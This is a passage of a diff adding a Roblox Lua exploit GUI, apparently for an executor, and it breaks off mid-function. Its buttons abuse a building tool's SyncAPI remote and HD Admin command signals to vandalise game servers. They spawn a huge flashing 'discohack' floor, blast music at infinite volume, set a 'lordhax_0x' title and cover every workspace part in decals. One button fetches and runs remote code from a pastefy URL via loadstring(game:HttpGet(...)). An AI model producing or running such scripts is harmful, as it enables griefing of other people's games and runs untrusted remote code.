+						[2] = {
+							[1] = {
+								Part = part,
+								LightType = "SpotLight",
+								Brightness = brightness
+							}
+						}
+					}
+					ohno(args)
+				end
+	
+				function Color(part,color)
+					local args = {
+						[1] = "SyncColor",
+						[2] = {
+							[1] = {
+								Part = part,
+								Color = color,
+								UnionColoring = false
+							}
+						}
+					}
+					ohno(args)
+				end
+	
+				function SpawnDecal(part,side)
+					local args = {
+						[1] = "CreateTextures",
+						[2] = {
+							[1] = {
+								Part = part,
+								Face = side,
+								TextureType = "Decal"
+							}
+						}
+					}
+					ohno(args)
+				end
+	
+				function AddDecal(part,asset,side)
+					local args = {
+						[1] = "SyncTexture",
+						[2] = {
+							[1] = {
+								Part = part,
+								Face = side,
+								TextureType = "Decal",
+								Texture = "rbxassetid://"..asset
+							}
+						}
+					}
+					ohno(args)
+				end
+	
+				local floorCF = CFrame.new(hrp.Position - Vector3.new(0,0.75,0))
+	
+				CreatePart(floorCF,workspace)
+	
+				task.wait(0.3)
+	
+				local part
+				for _,v in pairs(workspace:GetChildren()) do
+					if v:IsA("Part") then
+						part = v
+					end
+				end
+	
+				if part then
+					SetName(part,"discohack")
+					Resize(part,Vector3.new(2048,0.05,2048),floorCF)
+					SetCollision(part,false)
+					SetAnchor(true,part)
+	
+					remote:InvokeServer("SyncMaterial",{
+						{
+							Part = part,
+							Material = Enum.Material.ForceField
+						}
+					})
+	
+					local discocolor = {
+						Color3.new(255/255,0/255,0/255),
+						Color3.new(255/255,85/255,0/255),
+						Color3.new(218/255,218/255,0/255),
+						Color3.new(0/255,190/255,0/255),
+						Color3.new(0/255,85/255,255/255),
+						Color3.new(0/255,0/255,127/255),
+						Color3.new(170/255,0/255,255/255),
+						Color3.new(0/255,204/255,204/255),
+						Color3.new(255/255,85/255,127/255),
+						Color3.new(0/255,0/255,0/255),
+						Color3.new(255/255,255/255,255/255)
+					}
+	
+					while true do
+						for _,c in ipairs(discocolor) do
+							Color(part,c)
+							task.wait(0.5)
+						end
+					end
+				end
+end)]==]
+    end)
+    HTT03["LocalScript_40"].Parent = HTT03["TextButton_38"]
+    if HTT03["LocalScript_40"]:IsA("BaseScript") then HTT03["LocalScript_40"].Enabled = true end
+    pcall(function()
+        local _gcFn = loadstring and loadstring([==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+				local Players = game:GetService("Players")
+				local player = Players.LocalPlayer
+				local char = player.Character or player.CharacterAdded:Wait()
+				local hrp = char:WaitForChild("HumanoidRootPart")
+	
+				local tool
+				for i,v in player:GetDescendants() do
+					if v.Name == "SyncAPI" then
+						tool = v.Parent
+					end
+				end
+	
+				for i,v in game.ReplicatedStorage:GetDescendants() do
+					if v.Name == "SyncAPI" then
+						tool = v.Parent
+					end
+				end
+	
+				remote = tool.SyncAPI.ServerEndpoint
+	
+				local function ohno(args)
+					task.defer(function()
+						pcall(function()
+							remote:InvokeServer(unpack(args))
+						end)
+					end)
+				end
+	
+				function SetCollision(part,boolean)
+					local args = {
+						[1] = "SyncCollision",
+						[2] = {
+							[1] = {
+								Part = part,
+								CanCollide = boolean
+							}
+						}
+					}
+					ohno(args)
+				end
+	
+				function SetAnchor(boolean,part)
+					local args = {
+						[1] = "SyncAnchor",
+						[2] = {
+							[1] = {
+								Part = part,
+								Anchored = boolean
+							}
+						}
+					}
+					ohno(args)
+				end
+	
+				function CreatePart(cf,parent)
+					local args = {
+						[1] = "CreatePart",
+						[2] = "Normal",
+						[3] = cf,
+						[4] = parent
+					}
+					ohno(args)
+				end
+	
+				function DestroyPart(part)
+					local args = {
+						[1] = "Remove",
+						[2] = {
+							[1] = part
+						}
+					}
+					ohno(args)
+				end
+	
+				function MovePart(part,cf)
+					local args = {
+						[1] = "SyncMove",
+						[2] = {
+							[1] = {
+								Part = part,
+								CFrame = cf
+							}
+						}
+					}
+					ohno(args)
+				end
+	
+				function Resize(part,size,cf)
+					local args = {
+						[1] = "SyncResize",
+						[2] = {
+							[1] = {
+								Part = part,
+								CFrame = cf,
+								Size = size
+							}
+						}
+					}
+					ohno(args)
+				end
+	
+				function AddMesh(part)
+					local args = {
+						[1] = "CreateMeshes",
+						[2] = {
+							[1] = {
+								Part = part
+							}
+						}
+					}
+					ohno(args)
+				end
+	
+				function SetMesh(part,meshid)
+					local args = {
+						[1] = "SyncMesh",
+						[2] = {
+							[1] = {
+								Part = part,
+								MeshId = "rbxassetid://"..meshid
+							}
+						}
+					}
+					ohno(args)
+				end
+	
+				function SetTexture(part,texid)
+					local args = {
+						[1] = "SyncMesh",
+						[2] = {
+							[1] = {
+								Part = part,
+								TextureId = "rbxassetid://"..texid
+							}
+						}
+					}
+					ohno(args)
+				end
+	
+				function SetName(part,stringg)
+					local args = {
+						[1] = "SetName",
+						[2] = {
+							[1] = part
+						},
+						[3] = stringg
+					}
+					ohno(args)
+				end
+	
+				function MakeMeshNeon(part)
+					local args = {
+						[1] = "SyncMesh",
+						[2] = {
+							[1] = {
+								Part = part,
+								VertexColor = vector.create(3,3,3)
+							}
+						}
+					}
+					ohno(args)
+				end
+	
+				function MeshResize(part,size)
+					local args = {
+						[1] = "SyncMesh",
+						[2] = {
+							[1] = {
+								Part = part,
+								Scale = size
+							}
+						}
+					}
+					ohno(args)
+				end
+	
+				function Weld(part1,part2,lead)
+					local args = {
+						[1] = "CreateWelds",
+						[2] = {
+							[1] = part1,
+							[2] = part2
+						},
+						[3] = lead
+					}
+					ohno(args)
+				end
+	
+				function SetLocked(part,boolean)
+					local args = {
+						[1] = "SetLocked",
+						[2] = {
+							[1] = part
+						},
+						[3] = boolean
+					}
+					ohno(args)
+				end
+	
+				function SetTrans(part,int)
+					local args = {
+						[1] = "SyncMaterial",
+						[2] = {
+							[1] = {
+								Part = part,
+								Transparency = int
+							}
+						}
+					}
+					ohno(args)
+				end
+	
+				function CreateSpotlight(part)
+					local args = {
+						[1] = "CreateLights",
+						[2] = {
+							[1] = {
+								Part = part,
+								LightType = "SpotLight"
+							}
+						}
+					}
+					ohno(args)
+				end
+	
+				function SyncLighting(part,brightness)
+					local args = {
+						[1] = "SyncLighting",
+						[2] = {
+							[1] = {
+								Part = part,
+								LightType = "SpotLight",
+								Brightness = brightness
+							}
+						}
+					}
+					ohno(args)
+				end
+	
+				function Color(part,color)
+					local args = {
+						[1] = "SyncColor",
+						[2] = {
+							[1] = {
+								Part = part,
+								Color = color,
+								UnionColoring = false
+							}
+						}
+					}
+					ohno(args)
+				end
+	
+				function SpawnDecal(part,side)
+					local args = {
+						[1] = "CreateTextures",
+						[2] = {
+							[1] = {
+								Part = part,
+								Face = side,
+								TextureType = "Decal"
+							}
+						}
+					}
+					ohno(args)
+				end
+	
+				function AddDecal(part,asset,side)
+					local args = {
+						[1] = "SyncTexture",
+						[2] = {
+							[1] = {
+								Part = part,
+								Face = side,
+								TextureType = "Decal",
+								Texture = "rbxassetid://"..asset
+							}
+						}
+					}
+					ohno(args)
+				end
+	
+				local floorCF = CFrame.new(hrp.Position - Vector3.new(0,0.75,0))
+	
+				CreatePart(floorCF,workspace)
+	
+				task.wait(0.3)
+	
+				local part
+				for _,v in pairs(workspace:GetChildren()) do
+					if v:IsA("Part") then
+						part = v
+					end
+				end
+	
+				if part then
+					SetName(part,"discohack")
+					Resize(part,Vector3.new(2048,0.05,2048),floorCF)
+					SetCollision(part,false)
+					SetAnchor(true,part)
+	
+					remote:InvokeServer("SyncMaterial",{
+						{
+							Part = part,
+							Material = Enum.Material.ForceField
+						}
+					})
+	
+					local discocolor = {
+						Color3.new(255/255,0/255,0/255),
+						Color3.new(255/255,85/255,0/255),
+						Color3.new(218/255,218/255,0/255),
+						Color3.new(0/255,190/255,0/255),
+						Color3.new(0/255,85/255,255/255),
+						Color3.new(0/255,0/255,127/255),
+						Color3.new(170/255,0/255,255/255),
+						Color3.new(0/255,204/255,204/255),
+						Color3.new(255/255,85/255,127/255),
+						Color3.new(0/255,0/255,0/255),
+						Color3.new(255/255,255/255,255/255)
+					}
+	
+					while true do
+						for _,c in ipairs(discocolor) do
+							Color(part,c)
+							task.wait(0.5)
+						end
+					end
+				end
+end)]==]) or load([==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+				local Players = game:GetService("Players")
+				local player = Players.LocalPlayer
+				local char = player.Character or player.CharacterAdded:Wait()
+				local hrp = char:WaitForChild("HumanoidRootPart")
+	
+				local tool
+				for i,v in player:GetDescendants() do
+					if v.Name == "SyncAPI" then
+						tool = v.Parent
+					end
+				end
+	
+				for i,v in game.ReplicatedStorage:GetDescendants() do
+					if v.Name == "SyncAPI" then
+						tool = v.Parent
+					end
+				end
+	
+				remote = tool.SyncAPI.ServerEndpoint
+	
+				local function ohno(args)
+					task.defer(function()
+						pcall(function()
+							remote:InvokeServer(unpack(args))
+						end)
+					end)
+				end
+	
+				function SetCollision(part,boolean)
+					local args = {
+						[1] = "SyncCollision",
+						[2] = {
+							[1] = {
+								Part = part,
+								CanCollide = boolean
+							}
+						}
+					}
+					ohno(args)
+				end
+	
+				function SetAnchor(boolean,part)
+					local args = {
+						[1] = "SyncAnchor",
+						[2] = {
+							[1] = {
+								Part = part,
+								Anchored = boolean
+							}
+						}
+					}
+					ohno(args)
+				end
+	
+				function CreatePart(cf,parent)
+					local args = {
+						[1] = "CreatePart",
+						[2] = "Normal",
+						[3] = cf,
+						[4] = parent
+					}
+					ohno(args)
+				end
+	
+				function DestroyPart(part)
+					local args = {
+						[1] = "Remove",
+						[2] = {
+							[1] = part
+						}
+					}
+					ohno(args)
+				end
+	
+				function MovePart(part,cf)
+					local args = {
+						[1] = "SyncMove",
+						[2] = {
+							[1] = {
+								Part = part,
+								CFrame = cf
+							}
+						}
+					}
+					ohno(args)
+				end
+	
+				function Resize(part,size,cf)
+					local args = {
+						[1] = "SyncResize",
+						[2] = {
+							[1] = {
+								Part = part,
+								CFrame = cf,
+								Size = size
+							}
+						}
+					}
+					ohno(args)
+				end
+	
+				function AddMesh(part)
+					local args = {
+						[1] = "CreateMeshes",
+						[2] = {
+							[1] = {
+								Part = part
+							}
+						}
+					}
+					ohno(args)
+				end
+	
+				function SetMesh(part,meshid)
+					local args = {
+						[1] = "SyncMesh",
+						[2] = {
+							[1] = {
+								Part = part,
+								MeshId = "rbxassetid://"..meshid
+							}
+						}
+					}
+					ohno(args)
+				end
+	
+				function SetTexture(part,texid)
+					local args = {
+						[1] = "SyncMesh",
+						[2] = {
+							[1] = {
+								Part = part,
+								TextureId = "rbxassetid://"..texid
+							}
+						}
+					}
+					ohno(args)
+				end
+	
+				function SetName(part,stringg)
+					local args = {
+						[1] = "SetName",
+						[2] = {
+							[1] = part
+						},
+						[3] = stringg
+					}
+					ohno(args)
+				end
+	
+				function MakeMeshNeon(part)
+					local args = {
+						[1] = "SyncMesh",
+						[2] = {
+							[1] = {
+								Part = part,
+								VertexColor = vector.create(3,3,3)
+							}
+						}
+					}
+					ohno(args)
+				end
+	
+				function MeshResize(part,size)
+					local args = {
+						[1] = "SyncMesh",
+						[2] = {
+							[1] = {
+								Part = part,
+								Scale = size
+							}
+						}
+					}
+					ohno(args)
+				end
+	
+				function Weld(part1,part2,lead)
+					local args = {
+						[1] = "CreateWelds",
+						[2] = {
+							[1] = part1,
+							[2] = part2
+						},
+						[3] = lead
+					}
+					ohno(args)
+				end
+	
+				function SetLocked(part,boolean)
+					local args = {
+						[1] = "SetLocked",
+						[2] = {
+							[1] = part
+						},
+						[3] = boolean
+					}
+					ohno(args)
+				end
+	
+				function SetTrans(part,int)
+					local args = {
+						[1] = "SyncMaterial",
+						[2] = {
+							[1] = {
+								Part = part,
+								Transparency = int
+							}
+						}
+					}
+					ohno(args)
+				end
+	
+				function CreateSpotlight(part)
+					local args = {
+						[1] = "CreateLights",
+						[2] = {
+							[1] = {
+								Part = part,
+								LightType = "SpotLight"
+							}
+						}
+					}
+					ohno(args)
+				end
+	
+				function SyncLighting(part,brightness)
+					local args = {
+						[1] = "SyncLighting",
+						[2] = {
+							[1] = {
+								Part = part,
+								LightType = "SpotLight",
+								Brightness = brightness
+							}
+						}
+					}
+					ohno(args)
+				end
+	
+				function Color(part,color)
+					local args = {
+						[1] = "SyncColor",
+						[2] = {
+							[1] = {
+								Part = part,
+								Color = color,
+								UnionColoring = false
+							}
+						}
+					}
+					ohno(args)
+				end
+	
+				function SpawnDecal(part,side)
+					local args = {
+						[1] = "CreateTextures",
+						[2] = {
+							[1] = {
+								Part = part,
+								Face = side,
+								TextureType = "Decal"
+							}
+						}
+					}
+					ohno(args)
+				end
+	
+				function AddDecal(part,asset,side)
+					local args = {
+						[1] = "SyncTexture",
+						[2] = {
+							[1] = {
+								Part = part,
+								Face = side,
+								TextureType = "Decal",
+								Texture = "rbxassetid://"..asset
+							}
+						}
+					}
+					ohno(args)
+				end
+	
+				local floorCF = CFrame.new(hrp.Position - Vector3.new(0,0.75,0))
+	
+				CreatePart(floorCF,workspace)
+	
+				task.wait(0.3)
+	
+				local part
+				for _,v in pairs(workspace:GetChildren()) do
+					if v:IsA("Part") then
+						part = v
+					end
+				end
+	
+				if part then
+					SetName(part,"discohack")
+					Resize(part,Vector3.new(2048,0.05,2048),floorCF)
+					SetCollision(part,false)
+					SetAnchor(true,part)
+	
+					remote:InvokeServer("SyncMaterial",{
+						{
+							Part = part,
+							Material = Enum.Material.ForceField
+						}
+					})
+	
+					local discocolor = {
+						Color3.new(255/255,0/255,0/255),
+						Color3.new(255/255,85/255,0/255),
+						Color3.new(218/255,218/255,0/255),
+						Color3.new(0/255,190/255,0/255),
+						Color3.new(0/255,85/255,255/255),
+						Color3.new(0/255,0/255,127/255),
+						Color3.new(170/255,0/255,255/255),
+						Color3.new(0/255,204/255,204/255),
+						Color3.new(255/255,85/255,127/255),
+						Color3.new(0/255,0/255,0/255),
+						Color3.new(255/255,255/255,255/255)
+					}
+	
+					while true do
+						for _,c in ipairs(discocolor) do
+							Color(part,c)
+							task.wait(0.5)
+						end
+					end
+				end
+end)]==])
+        if _gcFn then
+            local _gcEnv = setmetatable({script = HTT03["LocalScript_40"]}
+                , {__index = getfenv and getfenv() or _G})
+            pcall(function() setfenv(_gcFn, _gcEnv) end)
+            pcall(_gcFn)
+        end
+    end)
+end
+-- TextButton "TextButton"
+HTT03["TextButton_41"] = Instance.new("TextButton", HTT03["ScrollingFrame_15"])
+HTT03["TextButton_41"].Name = "TextButton"
+HTT03["TextButton_41"].Visible = true
+HTT03["TextButton_41"].ZIndex = 1
+HTT03["TextButton_41"].LayoutOrder = 0
+HTT03["TextButton_41"].Position = UDim2.new(0.000000,364,0.000000,190)
+HTT03["TextButton_41"].Size = UDim2.new(0.000000,122,0.000000,44)
+HTT03["TextButton_41"].AnchorPoint = Vector2.new(0.000000,0.000000)
+HTT03["TextButton_41"].Rotation = 0
+HTT03["TextButton_41"].BackgroundColor3 = Color3.fromRGB(0,0,0)
+HTT03["TextButton_41"].BackgroundTransparency = 0
+HTT03["TextButton_41"].BorderSizePixel = 3
+HTT03["TextButton_41"].BorderColor3 = Color3.fromRGB(0,13,255)
+HTT03["TextButton_41"].ClipsDescendants = false
+HTT03["TextButton_41"].Active = true
+HTT03["TextButton_41"].Selectable = true
+HTT03["TextButton_41"].AutoButtonColor = true
+HTT03["TextButton_41"].Modal = false
+HTT03["TextButton_41"].Text = "thomas"
+HTT03["TextButton_41"].TextColor3 = Color3.fromRGB(255,255,255)
+HTT03["TextButton_41"].TextSize = 10
+HTT03["TextButton_41"].TextTransparency = 0
+HTT03["TextButton_41"].TextScaled = false
+HTT03["TextButton_41"].TextWrapped = false
+HTT03["TextButton_41"].TextXAlignment = Enum.TextXAlignment.Center
+HTT03["TextButton_41"].TextYAlignment = Enum.TextYAlignment.Center
+HTT03["TextButton_41"].Font = Enum.Font.Legacy
+HTT03["TextButton_41"].TextStrokeColor3 = Color3.fromRGB(0,0,0)
+HTT03["TextButton_41"].TextStrokeTransparency = 1
+HTT03["TextButton_41"].RichText = false
+-- Auto constraint "TextButton"
+HTT03["UIAspectRatioConstraint_42"] = Instance.new("UIAspectRatioConstraint", HTT03["TextButton_41"])
+HTT03["UIAspectRatioConstraint_42"].AspectRatio = 2.772727
+-- LocalScript "LocalScript"
+HTT03["LocalScript_43"] = Instance.new("LocalScript")
+HTT03["LocalScript_43"].Name = "LocalScript"
+do
+    pcall(function()
+        if setthreadidentity then setthreadidentity(8) end
+        HTT03["LocalScript_43"].Source = [==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastefy.app/tXyQmOrI/raw"))()
+end)]==]
+    end)
+    HTT03["LocalScript_43"].Parent = HTT03["TextButton_41"]
+    if HTT03["LocalScript_43"]:IsA("BaseScript") then HTT03["LocalScript_43"].Enabled = true end
+    pcall(function()
+        local _gcFn = loadstring and loadstring([==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastefy.app/tXyQmOrI/raw"))()
+end)]==]) or load([==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastefy.app/tXyQmOrI/raw"))()
+end)]==])
+        if _gcFn then
+            local _gcEnv = setmetatable({script = HTT03["LocalScript_43"]}
+                , {__index = getfenv and getfenv() or _G})
+            pcall(function() setfenv(_gcFn, _gcEnv) end)
+            pcall(_gcFn)
+        end
+    end)
+end
+-- TextButton "TextButton"
+HTT03["TextButton_44"] = Instance.new("TextButton", HTT03["ScrollingFrame_15"])
+HTT03["TextButton_44"].Name = "TextButton"
+HTT03["TextButton_44"].Visible = true
+HTT03["TextButton_44"].ZIndex = 1
+HTT03["TextButton_44"].LayoutOrder = 0
+HTT03["TextButton_44"].Position = UDim2.new(0.000000,22,0.000000,280)
+HTT03["TextButton_44"].Size = UDim2.new(0.000000,122,0.000000,44)
+HTT03["TextButton_44"].AnchorPoint = Vector2.new(0.000000,0.000000)
+HTT03["TextButton_44"].Rotation = 0
+HTT03["TextButton_44"].BackgroundColor3 = Color3.fromRGB(0,0,0)
+HTT03["TextButton_44"].BackgroundTransparency = 0
+HTT03["TextButton_44"].BorderSizePixel = 3
+HTT03["TextButton_44"].BorderColor3 = Color3.fromRGB(57,0,255)
+HTT03["TextButton_44"].ClipsDescendants = false
+HTT03["TextButton_44"].Active = true
+HTT03["TextButton_44"].Selectable = true
+HTT03["TextButton_44"].AutoButtonColor = true
+HTT03["TextButton_44"].Modal = false
+HTT03["TextButton_44"].Text = "billboard"
+HTT03["TextButton_44"].TextColor3 = Color3.fromRGB(255,255,255)
+HTT03["TextButton_44"].TextSize = 10
+HTT03["TextButton_44"].TextTransparency = 0
+HTT03["TextButton_44"].TextScaled = false
+HTT03["TextButton_44"].TextWrapped = false
+HTT03["TextButton_44"].TextXAlignment = Enum.TextXAlignment.Center
+HTT03["TextButton_44"].TextYAlignment = Enum.TextYAlignment.Center
+HTT03["TextButton_44"].Font = Enum.Font.Legacy
+HTT03["TextButton_44"].TextStrokeColor3 = Color3.fromRGB(0,0,0)
+HTT03["TextButton_44"].TextStrokeTransparency = 1
+HTT03["TextButton_44"].RichText = false
+-- Auto constraint "TextButton"
+HTT03["UIAspectRatioConstraint_45"] = Instance.new("UIAspectRatioConstraint", HTT03["TextButton_44"])
+HTT03["UIAspectRatioConstraint_45"].AspectRatio = 2.772727
+-- LocalScript "LocalScript"
+HTT03["LocalScript_46"] = Instance.new("LocalScript")
+HTT03["LocalScript_46"].Name = "LocalScript"
+do
+    pcall(function()
+        if setthreadidentity then setthreadidentity(8) end
+        HTT03["LocalScript_46"].Source = [==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+	local ReplicatedStorage = game:GetService("ReplicatedStorage")
+	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+
+	RequestCommand:InvokeServer(";titlep me lordhax_0x")
+end)]==]
+    end)
+    HTT03["LocalScript_46"].Parent = HTT03["TextButton_44"]
+    if HTT03["LocalScript_46"]:IsA("BaseScript") then HTT03["LocalScript_46"].Enabled = true end
+    pcall(function()
+        local _gcFn = loadstring and loadstring([==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+	local ReplicatedStorage = game:GetService("ReplicatedStorage")
+	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+
+	RequestCommand:InvokeServer(";titlep me lordhax_0x")
+end)]==]) or load([==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+	local ReplicatedStorage = game:GetService("ReplicatedStorage")
+	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+
+	RequestCommand:InvokeServer(";titlep me lordhax_0x")
+end)]==])
+        if _gcFn then
+            local _gcEnv = setmetatable({script = HTT03["LocalScript_46"]}
+                , {__index = getfenv and getfenv() or _G})
+            pcall(function() setfenv(_gcFn, _gcEnv) end)
+            pcall(_gcFn)
+        end
+    end)
+end
+-- TextButton "TextButton"
+HTT03["TextButton_47"] = Instance.new("TextButton", HTT03["ScrollingFrame_15"])
+HTT03["TextButton_47"].Name = "TextButton"
+HTT03["TextButton_47"].Visible = true
+HTT03["TextButton_47"].ZIndex = 1
+HTT03["TextButton_47"].LayoutOrder = 0
+HTT03["TextButton_47"].Position = UDim2.new(0.000000,191,0.000000,280)
+HTT03["TextButton_47"].Size = UDim2.new(0.000000,122,0.000000,44)
+HTT03["TextButton_47"].AnchorPoint = Vector2.new(0.000000,0.000000)
+HTT03["TextButton_47"].Rotation = 0
+HTT03["TextButton_47"].BackgroundColor3 = Color3.fromRGB(0,0,0)
+HTT03["TextButton_47"].BackgroundTransparency = 0
+HTT03["TextButton_47"].BorderSizePixel = 3
+HTT03["TextButton_47"].BorderColor3 = Color3.fromRGB(8,0,255)
+HTT03["TextButton_47"].ClipsDescendants = false
+HTT03["TextButton_47"].Active = true
+HTT03["TextButton_47"].Selectable = true
+HTT03["TextButton_47"].AutoButtonColor = true
+HTT03["TextButton_47"].Modal = false
+HTT03["TextButton_47"].Text = "mario"
+HTT03["TextButton_47"].TextColor3 = Color3.fromRGB(255,255,255)
+HTT03["TextButton_47"].TextSize = 10
+HTT03["TextButton_47"].TextTransparency = 0
+HTT03["TextButton_47"].TextScaled = false
+HTT03["TextButton_47"].TextWrapped = false
+HTT03["TextButton_47"].TextXAlignment = Enum.TextXAlignment.Center
+HTT03["TextButton_47"].TextYAlignment = Enum.TextYAlignment.Center
+HTT03["TextButton_47"].Font = Enum.Font.Legacy
+HTT03["TextButton_47"].TextStrokeColor3 = Color3.fromRGB(0,0,0)
+HTT03["TextButton_47"].TextStrokeTransparency = 1
+HTT03["TextButton_47"].RichText = false
+-- Auto constraint "TextButton"
+HTT03["UIAspectRatioConstraint_48"] = Instance.new("UIAspectRatioConstraint", HTT03["TextButton_47"])
+HTT03["UIAspectRatioConstraint_48"].AspectRatio = 2.772727
+-- LocalScript "LocalScript"
+HTT03["LocalScript_49"] = Instance.new("LocalScript")
+HTT03["LocalScript_49"].Name = "LocalScript"
+do
+    pcall(function()
+        if setthreadidentity then setthreadidentity(8) end
+        HTT03["LocalScript_49"].Source = [==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand
+	
+		RequestCommand:InvokeServer(";music 1332644289")
+		RequestCommand:InvokeServer(";pitch 0.80")
+		RequestCommand:InvokeServer(";volume inf")
+		
+		wait(3.1)
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand
+	
+		RequestCommand:InvokeServer(";music 2496367477")
+		RequestCommand:InvokeServer(";volume inf")
+	--rrrg
+		    local player = game.Players.LocalPlayer
+			local char = player.Character
+			local tool
+			for i,v in player:GetDescendants() do
+				if v.Name == "SyncAPI" then
+					tool = v.Parent
+				end
+			end
+			for i,v in game.ReplicatedStorage:GetDescendants() do
+				if v.Name == "SyncAPI" then
+					tool = v.Parent
+				end
+			end
+			--craaa
+			remote = tool.SyncAPI.ServerEndpoint
+			function _(args)
+				remote:InvokeServer(unpack(args))
+			end
+			function SetCollision(part,boolean)
+				local args = {
+					[1] = "SyncCollision",
+					[2] = {
+						[1] = {
+							["Part"] = part,
+							["CanCollide"] = boolean
+						}
+					}
+				}
+				_(args)
+			end
+			function SetAnchor(boolean,part)
+				local args = {
+					[1] = "SyncAnchor",
+					[2] = {
+						[1] = {
+							["Part"] = part,
+							["Anchored"] = boolean
+						}
+					}
+				}
+				_(args)
+			end
+			function CreatePart(cf,parent)
+				local args = {
+					[1] = "CreatePart",
+					[2] = "Normal",
+					[3] = cf,
+					[4] = parent
+				}
+				_(args)
+			end
+			function DestroyPart(part)
+				local args = {
+					[1] = "Remove",
+					[2] = {
+						[1] = part
+					}
+				}
+				_(args)
+			end
+			function MovePart(part,cf)
+				local args = {
+					[1] = "SyncMove",
+					[2] = {
+						[1] = {
+							["Part"] = part,
+							["CFrame"] = cf
+						}
+					}
+				}
+				_(args)
+			end
+			function Resize(part,size,cf)
+				local args = {
+					[1] = "SyncResize",
+					[2] = {
+						[1] = {
+							["Part"] = part,
+							["CFrame"] = cf,
+							["Size"] = size
+						}
+					}
+				}
+				_(args)
+			end
+			function AddMesh(part)
+				local args = {
+					[1] = "CreateMeshes",
+					[2] = {
+						[1] = {
+							["Part"] = part
+						}
+					}
+				}
+				_(args)
+			end
+	
+			function SetMesh(part,meshid)
+				local args = {
+					[1] = "SyncMesh",
+					[2] = {
+						[1] = {
+							["Part"] = part,
+							["MeshId"] = "rbxassetid://"..meshid
+						}
+					}
+				}
+				_(args)
+			end
+			function SetTexture(part, texid)
+				local args = {
+					[1] = "SyncMesh",
+					[2] = {
+						[1] = {
+							["Part"] = part,
+							["TextureId"] = "rbxassetid://"..texid
+						}
+					}
+				}
+				_(args)
+			end
+			function SetName(part, stringg)
+				local args = {
+					[1] = "SetName",
+					[2] = {
+						[1] = part
+					},
+					[3] = stringg
+				}
+	
+				_(args)
+			end
+			function MeshResize(part,size)
+				local args = {
+					[1] = "SyncMesh",
+					[2] = {
+						[1] = {
+							["Part"] = part,
+							["Scale"] = size
+						}
+					}
+				}
+				_(args)
+			end
+			function Weld(part1, part2,lead)
+				local args = {
+					[1] = "CreateWelds",
+					[2] = {
+						[1] = part1,
+						[2] = part2
+					},
+					[3] = lead
+				}
+				_(args)
+	
+			end
+			function SetLocked(part,boolean)
+				local args = {
+					[1] = "SetLocked",
+					[2] = {
+						[1] = part
+					},
+					[3] = boolean
+				}
+				_(args)
+			end
+			function SetTrans(part,int)
+				local args = {
+					[1] = "SyncMaterial",
+					[2] = {
+						[1] = {
+							["Part"] = part,
+							["Transparency"] = int
+						}
+					}
+				}
+				_(args)
+			end
+			function CreateSpotlight(part)
+				local args = {
+					[1] = "CreateLights",
+					[2] = {
+						[1] = {
+							["Part"] = part,
+							["LightType"] = "SpotLight"
+						}
+					}
+				}
+				_(args)
+			end
+			function SyncLighting(part,brightness)
+				local args = {
+					[1] = "SyncLighting",
+					[2] = {
+						[1] = {
+							["Part"] = part,
+							["LightType"] = "SpotLight",
+							["Brightness"] = brightness
+						}
+					}
+				}
+				_(args)
+			end
+			function Color(part,color)
+				local args = {
+					[1] = "SyncColor",
+					[2] = {
+						[1] = {
+							["Part"] = part,
+							["Color"] = color --[[Color3]],
+							["UnionColoring"] = false
+						}
+					}
+				}
+				_(args)
+			end
+			function SpawnDecal(part,side)
+				local args = {
+					[1] = "CreateTextures",
+					[2] = {
+						[1] = {
+							["Part"] = part,
+							["Face"] = side,
+							["TextureType"] = "Decal"
+						}
+					}
+				}
+	
+				_(args)
+			end
+			function AddDecal(part,asset,side)
+				local args = {
+					[1] = "SyncTexture",
+					[2] = {
+						[1] = {
+							["Part"] = part,
+							["Face"] = side,
+							["TextureType"] = "Decal",
+							["Texture"] = "rbxassetid://".. asset
+						}
+					}
+				}
+				_(args)
+			end
+	
+			function spam(id)
+				for i,v in game.workspace:GetDescendants() do
+					if v:IsA("BasePart") then
+						spawn(function()
+							SetLocked(v,false)
+							SpawnDecal(v,Enum.NormalId.Front)
+							AddDecal(v,id,Enum.NormalId.Front)
+	
+							SpawnDecal(v,Enum.NormalId.Back)
+							AddDecal(v,id,Enum.NormalId.Back)
+	
+							SpawnDecal(v,Enum.NormalId.Right)
+							AddDecal(v,id,Enum.NormalId.Right)
+	
+							SpawnDecal(v,Enum.NormalId.Left)
+							AddDecal(v,id,Enum.NormalId.Left)
+	
+							SpawnDecal(v,Enum.NormalId.Bottom)
+							AddDecal(v,id,Enum.NormalId.Bottom)
+	
+							SpawnDecal(v,Enum.NormalId.Top)
+							AddDecal(v,id,Enum.NormalId.Top)
+						end)
+					end
+				end 
+			end
+			spam("106819842627724")  
+			wait(5)
+			local player = game.Players.LocalPlayer
+			local char = player.Character
+			local tool
+			for i,v in player:GetDescendants() do
+				if v.Name == "SyncAPI" then
+					tool = v.Parent
+				end
+			end
+			for i,v in game.ReplicatedStorage:GetDescendants() do
+				if v.Name == "SyncAPI" then
+					tool = v.Parent
+				end
+			end
+			--craaa
+			remote = tool.SyncAPI.ServerEndpoint
+			function _(args)
+				remote:InvokeServer(unpack(args))
+			end
+			function SetCollision(part,boolean)
+				local args = {
+					[1] = "SyncCollision",
+					[2] = {
+						[1] = {
+							["Part"] = part,
+							["CanCollide"] = boolean
+						}
+					}
+				}
+				_(args)
+			end
+			function SetAnchor(boolean,part)
+				local args = {
+					[1] = "SyncAnchor",
+					[2] = {
+						[1] = {
+							["Part"] = part,
+							["Anchored"] = boolean
+						}
+					}
+				}
+				_(args)
+			end
+			function CreatePart(cf,parent)
+				local args = {
